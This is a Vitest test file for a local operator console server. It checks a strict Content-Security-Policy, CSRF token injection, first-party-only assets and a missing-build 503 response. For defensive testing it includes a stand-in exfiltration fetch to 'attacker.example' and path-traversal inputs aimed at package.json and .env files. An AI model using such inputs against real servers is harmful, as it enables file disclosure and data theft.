// @vitest-environment node
import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import { once } from "node:events";
import { tmpdir } from "node:os";
import { afterAll, beforeAll, describe, test } from "vitest";

import { createLocalOperatorServer } from "../src/operator-ui/server";

// D4 CSP regression: the console ships first-party assets only. The header
// must never reintroduce inline scripts or third-party origins, the asset
// routes must refuse path escapes, and a missing build must surface as a
// fixable 503 instead of a silent blank page.

// React's SVG namespace string is data, not a network origin. reactjs.org
// appears only inside React's production error-decoder string literals.
// The React 19 decoder adds a separate react.dev/errors URL literal to the
// bundled JavaScript. Match that single compiler-emitted source spelling
// below; never allow react.dev as a general third-party asset origin.
//
// Zod is in the bundle because compliance packs zod-parse at module load
// (fail-fast if shipped data is invalid). Its shipped string constants are
// validation data, never fetched origins: the $ZodIPv6 normalization
// builds its example URL from a template literal `http://[${e}]`, and
// $toJSONSchema emits JSON Schema dialect IDENTIFIERS on json-schema.org
// (the namespace's own vocabulary for naming dialects). Both allowlisted.
const SAFE_URL =
  /^(https?:\/\/(127\.0\.0\.1|localhost|www\.w3\.org|reactjs\.org|json-schema\.org|\[\$\{)|data:|mailto:|#|\/)/;

function assertFirstPartyOnly(text: string, label: string) {
  const urls = text.match(/https?:\/\/[^"'\s)<>]+/g) ?? [];
  for (const url of urls) {
    // The React production error decoder constructs a help URL in a string
    // literal. It is not an imported script, asset, beacon, or fetch target.
    // Keep the single observed minified spelling pinned, rather than
    // allowlisting react.dev (which would mask an active third-party URL).
    const reactErrorDecoder =
      label.startsWith("/assets/") &&
      label.endsWith(".js") &&
      url === "https://react.dev/errors/`+e;if(1";
    assert.ok(
      SAFE_URL.test(url) || reactErrorDecoder,
      `${label} carries a third-party origin: ${url}`,
    );
  }
}

describe("first-party console delivery", () => {
  let url = "";
  let close = async () => {};

  beforeAll(async () => {
    const { server } = createLocalOperatorServer({
      root: process.cwd(),
      runner: async () => "SYNTHETIC PASS / ACT DISABLED",
    });
    server.listen(0, "127.0.0.1");
    await once(server, "listening");
    const address = server.address();
    if (!address || typeof address === "string") throw new Error("ADDRESS_UNAVAILABLE");
    url = `http://127.0.0.1:${address.port}`;
    close = () => new Promise<void>((resolve) => server.close(() => resolve()));
  });

  afterAll(close);

  test("CSP is first-party only: self scripts, self styles, self font, no inline", async () => {
    const page = await fetch(url);
    assert.equal(page.status, 200);
    const csp = page.headers.get("content-security-policy") ?? "";
    for (const required of [
      "default-src 'none'",
      "script-src 'self'",
      "style-src 'self'",
      "font-src 'self'",
      "connect-src 'self'",
      "form-action 'self'",
      "base-uri 'none'",
      "frame-ancestors 'none'",
    ]) {
      assert.ok(csp.includes(required), `CSP missing "${required}": ${csp}`);
    }
    assert.ok(!csp.includes("unsafe-inline"), "CSP must not allow inline content");
    assert.ok(!csp.includes("nonce-"), "CSP must not fall back to nonce scripts");
  });

  test("served shell injects the CSRF carrier and carries no third-party origin", async () => {
    const page = await fetch(url);
    const html = await page.text();
    assert.ok(!html.includes("__ALZ_CSRF_TOKEN__"), "placeholder must be replaced per session");
    // Attribute order varies; pull the value out of the carrier tag itself.
    const carrier = html.match(/<input[^>]*data-operator-csrf[^>]*>/)?.[0] ?? "";
    const token = carrier.match(/value="([^"]+)"/)?.[1] ?? "";
    assert.match(token, /^[0-9a-f]{24,}$/);
    assertFirstPartyOnly(html, "served shell");
  });

  test("built assets are served from first-party routes with strict types", async () => {
    const html = await (await fetch(url)).text();
    const script = html.match(/src="(\/assets\/[^"]+\.js)"/)?.[1];
    const stylesheet = html.match(/href="(\/assets\/[^"]+\.css)"/)?.[1];
    assert.ok(script, "shell must reference a bundled script");
    assert.ok(stylesheet, "shell must reference a bundled stylesheet");
    for (const [path, type] of [
      [script, "text/javascript"],
      [stylesheet, "text/css"],
      ["/fonts/PressStart2P-Regular.woff2", "font/woff2"],
    ] as const) {
      const asset = await fetch(url + path);
      assert.equal(asset.status, 200, `${path} should be served`);
      assert.ok((asset.headers.get("content-type") ?? "").startsWith(type));
      assertFirstPartyOnly(await asset.text(), path);
    }
  });

  test("asset routes refuse path escapes and unknown names", async () => {
    for (const hostile of [
      "/assets/../../../package.json",
      "/assets/..%2F..%2Fpackage.json",
      "/assets/missing.js",
      "/fonts/secrets.env",
      "/internal/../../.env",
    ]) {
      const response = await fetch(url + hostile);
      assert.notEqual(response.status, 200, `${hostile} must not be served`);
    }
  });
});

describe("missing build surfaces a fixable state", () => {
  test("empty UI root yields 503 CONSOLE_BUILD_MISSING", async () => {
    const emptyRoot = await mkdtemp(`${tmpdir()}/alz-ui-missing-`);
    const { server } = createLocalOperatorServer({
      root: emptyRoot,
      runner: async () => "unused",
    });
    server.listen(0, "127.0.0.1");
    await once(server, "listening");
    try {
      const address = server.address();
      if (!address || typeof address === "string") throw new Error("ADDRESS_UNAVAILABLE");
      const response = await fetch(`http://127.0.0.1:${address.port}`);
      assert.equal(response.status, 503);
      const body = (await response.json()) as { error?: string; hint?: string };
      assert.equal(body.error, "CONSOLE_BUILD_MISSING");
      assert.match(body.hint ?? "", /build:ui/);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });
});

test("first-party asset scanner rejects executable third-party origins and other React URLs", () => {
  for (const text of [
    'fetch("https://attacker.example/exfil")',
    'fetch("https://react.dev/errors/123")',
    'const image = "https://react.dev/another-path"',
    '<script src="https://react.dev/errors/123"></script>',
  ]) {
    assert.throws(() => assertFirstPartyOnly(text, "/assets/sample.js"), /third-party origin/);
  }
  // Inert decoder source is tolerated only for a bundled JavaScript asset,
  // never as a URL in served HTML or stylesheet markup.
  const decoder = 'https://react.dev/errors/`+e;if(1';
  assert.doesNotThrow(() => assertFirstPartyOnly(decoder, "/assets/sample.js"));
  assert.throws(() => assertFirstPartyOnly(decoder, "served shell"), /third-party origin/);
});
